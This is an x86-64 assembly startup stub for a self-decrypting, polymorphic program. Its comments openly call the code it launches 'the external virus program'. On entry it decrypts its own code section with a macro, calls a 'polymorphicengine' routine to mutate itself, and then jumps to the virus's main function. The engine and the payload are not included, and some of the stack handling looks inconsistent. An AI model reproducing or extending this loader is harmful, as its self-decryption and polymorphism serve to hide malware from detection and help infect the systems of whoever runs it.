%include "template.asm.inc"
extern main
extern polymorphicengine
; Define variables in the data section
section .data
	hello:     db 'Hello world!',10
	helloLen:  equ $-hello

; Code goes in the text section
section .text
	global _start

align 16
_start:             ; Global entry point

	; ; save variables to stack for calling main later

	;rbx never changes after decrypt function call, so store rsp there
	;do this the first action to preserve integrity of rsp as the value of rsp will change every instruction parsed
	mov rbx, rsp

	; save current state on stack
	push rsp
	push rdi
	push rsi

    call decrypt

	; reload the initial program, state
	pop rsi
	pop rdi
	pop rsp

	; save current state on stack
	push rsp
	push rdi
	push rsi

	; call polymorph engine
	xor rbp, rbp
	pop rdi
	mov rsi, rsp
	lea rdx, [rsp+rdi+8*8]
	push rdi
	call polymorphicengine
	
	; reload the initial program, state
	pop rsi
	pop rdi
	pop rsp

	; call the external virus program
	xor rbp, rbp
	pop rdi
	mov rsi, rsp
	lea rdx, [rsp+rdi+8*8]
	push rdi
	call main
	
	mov rdi, rax
	mov eax, 1
	int 80h



decrypt:
	; there is automatic calculation happening inside DECRYPTOR_SECTION function which is (_start-main) == xxxh worth of memory that will be encrypted/decrypted
    DECRYPTOR_SECTION main, _start
    ret